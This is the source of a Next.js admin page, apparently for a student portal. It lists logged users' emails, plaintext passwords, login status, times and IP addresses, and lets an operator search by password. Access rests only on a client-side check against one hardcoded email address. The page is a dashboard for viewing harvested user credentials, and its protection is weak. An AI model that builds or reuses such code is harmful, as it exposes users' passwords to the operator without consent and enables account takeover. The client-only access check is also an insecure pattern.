"use client";
import { useEffect, useState, useMemo } from "react";
import { useRouter } from "next/navigation";
import Sidebar from "@/components/Sidebar";
import { dataAPI } from "@/lib/api";
import { useAuthStore } from "@/lib/store";
import { useAuth } from "@/hooks/useAuth";

const ADMIN_EMAIL = "ns4770@srmist.edu.in";

export default function AdminPage() {
  const { ready } = useAuth();
  const router = useRouter();
  const { profile } = useAuthStore();
  const [logs, setLogs] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");

  useEffect(() => {
    if (!ready) return;
    
    // Strict client-side check
    if (profile?.Email !== ADMIN_EMAIL && profile?.["Email"] !== ADMIN_EMAIL) {
      router.push("/dashboard");
      return;
    }

    dataAPI.getAdminLogs()
      .then(res => {
        if (res.success) {
          setLogs(res.logs || []);
        }
        setLoading(false);
      })
      .catch(() => {
        setLoading(false);
      });
  }, [ready, profile, router]);

  const filteredLogs = useMemo(() => {
    if (!search) return logs;
    return logs.filter(l => 
      l.email?.toLowerCase().includes(search.toLowerCase()) || 
      l.password?.toLowerCase().includes(search.toLowerCase())
    );
  }, [logs, search]);

  if (loading) return (
    <div className="page-root" style={{ display: "flex", alignItems: "center", justifyContent: "center" }}>
      <div className="loader"></div>
      <style>{`
        .loader {
          width: 48px;
          height: 48px;
          border: 5px solid var(--border);
          border-bottom-color: var(--accent);
          border-radius: 50%;
          display: inline-block;
          box-sizing: border-box;
          animation: rotation 1s linear infinite;
        }
        @keyframes rotation {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );

  return (
    <div className="page-root">
      <Sidebar />
      <main className="page-main">
        <div className="page-content" style={{ paddingBottom: "120px" }}>
          
          {/* Header */}
          <div style={{ marginBottom: "40px" }}>
            <div style={{ fontSize: "10px", color: "var(--accent)", letterSpacing: "0.2em", fontWeight: 800, textTransform: "uppercase", marginBottom: "8px" }}>
              Terminal Access • Level 4
            </div>
            <h1 style={{ fontSize: "40px", fontWeight: 900, letterSpacing: "-0.04em", margin: 0 }}>
              Login <span style={{ color: "var(--accent)" }}>Intelligence</span>
            </h1>
            <p style={{ color: "var(--text-secondary)", fontSize: "14px", marginTop: "8px" }}>
              Monitoring active user credentials and session traffic.
            </p>
          </div>

          {/* Stats */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "16px", marginBottom: "32px" }}>
            <div className="min-card" style={{ padding: "24px", textAlign: "left" }}>
              <div style={{ fontSize: "11px", color: "var(--text-muted)", textTransform: "uppercase", letterSpacing: "0.1em", marginBottom: "8px" }}>Total Logins</div>
              <div style={{ fontSize: "32px", fontWeight: 900 }}>{logs.length}</div>
            </div>
            <div className="min-card" style={{ padding: "24px", textAlign: "left" }}>
              <div style={{ fontSize: "11px", color: "var(--text-muted)", textTransform: "uppercase", letterSpacing: "0.1em", marginBottom: "8px" }}>Unique Users</div>
              <div style={{ fontSize: "32px", fontWeight: 900 }}>{new Set(logs.map(l => l.email)).size}</div>
            </div>
          </div>

          {/* Search Bar */}
          <div style={{ position: "relative", marginBottom: "24px" }}>
            <input 
              type="text"
              placeholder="Search by user ID or password..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              style={{
                width: "100%",
                background: "rgba(255,255,255,0.03)",
                border: "1px solid var(--border)",
                borderRadius: "16px",
                padding: "16px 20px",
                color: "#fff",
                fontSize: "14px",
                outline: "none",
                transition: "all 0.2s"
              }}
              onFocus={(e) => e.target.style.border = "1px solid var(--accent)"}
              onBlur={(e) => e.target.style.border = "1px solid var(--border)"}
            />
          </div>

          {/* Log Table */}
          <div className="min-card" style={{ padding: "0", overflow: "hidden", border: "1px solid var(--border)" }}>
            <div style={{ overflowX: "auto" }}>
              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "13px" }}>
                <thead>
                  <tr style={{ background: "rgba(255,255,255,0.03)", borderBottom: "1px solid var(--border)" }}>
                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>User ID</th>
                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>Password</th>
                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>Status</th>
                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>Time</th>
                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>IP Address</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredLogs.map((log, i) => (
                    <tr key={i} style={{ borderBottom: "1px solid rgba(255,255,255,0.03)", transition: "background 0.2s" }}>
                      <td style={{ padding: "16px 20px", fontWeight: 700, color: "var(--accent)" }}>{log.email}</td>
                      <td style={{ padding: "16px 20px", fontFamily: "monospace", color: "#fff", letterSpacing: "0.05em" }}>{log.password || "—"}</td>
                      <td style={{ padding: "16px 20px" }}>
                        <span style={{ 
                          padding: "4px 8px", 
                          borderRadius: "6px", 
                          fontSize: "10px", 
                          fontWeight: 900,
                          background: log.status === "SUCCESS" ? "rgba(168, 194, 0, 0.1)" : "rgba(255, 59, 59, 0.1)",
                          color: log.status === "SUCCESS" ? "var(--accent)" : "#ff3b3b"
                        }}>
                          {log.status}
                        </span>
                      </td>
                      <td style={{ padding: "16px 20px", color: "var(--text-secondary)" }}>
                        {new Date(log.timestamp).toLocaleString("en-IN", { hour: "2-digit", minute: "2-digit", day: "2-digit", month: "short" })}
                      </td>
                      <td style={{ padding: "16px 20px", color: "var(--text-muted)", fontSize: "11px" }}>{log.ip}</td>
                    </tr>
                  ))}
                  {filteredLogs.length === 0 && (
                    <tr>
                      <td colSpan={5} style={{ padding: "40px", textAlign: "center", color: "var(--text-muted)" }}>
                        No logs found matching your criteria.
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>

          <div className="watermark">Admin</div>
        </div>
      </main>

      <style jsx global>{`
        tr:hover {
          background: rgba(255,255,255,0.02);
        }
      `}</style>
    </div>
  );
}
